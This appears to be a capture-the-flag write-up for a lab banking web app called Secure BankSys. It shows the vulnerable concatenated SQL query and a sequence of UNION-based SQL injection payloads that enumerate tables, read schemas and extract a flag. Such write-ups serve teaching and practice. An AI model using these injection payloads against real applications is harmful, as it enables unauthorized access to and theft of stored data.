# Secure BankSys

<figure><img src="https://miro.medium.com/v2/resize:fit:541/1*REZIxHj__1pvQN_BJZEpkg.png" alt="" height="343" width="481"><figcaption></figcaption></figure>

by Looking at the web app we find there is three pages\
main page\
accounts\
and\
in the accounts tab we perform a simple sql injection like this

<figure><img src="https://miro.medium.com/v2/resize:fit:788/1*OFzsjRrOobAhA2t0350uEA.png" alt="" height="328" width="700"><figcaption></figcaption></figure>

we know webapp vunrable to sqli\
The vulnerability is in the `/search` route in `app.py`:

```
sql_query = f"SELECT account_number, customer_name, balance, account_type FROM accounts WHERE account_number LIKE '%{query}%' OR customer_name LIKE '%{query}%' OR account_type LIKE '%{query}%'"
```

The user input is directly concatenated into the SQL query without parameterization, making it vulnerable to SQL injection.

We can explore the database structure with UNION-based injection:

```
' UNION SELECT 1,2,3,4 --
```

This will help us determine the number of columns (4) and their data types.

To find the table names:

```
' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --
```

This should reveal the tables: `accounts`, `users`, `internal_data`, and `search_logs`.

to find the columns names:

`' UNION SELECT 1,2,3,sql FROM sqlite_master WHERE tbl_name = 'internal_data' -- -`

Now that we know there’s an `internal_data` table, we can extract its contents:

```
' UNION SELECT 1, content, 3, 4 FROM internal_data --
```

This should reveal the flag: `Spark{G00d_J0B_K1nG_Y0u_4R3_C00k1nGG_1ZSQMLK9LQSX21}`
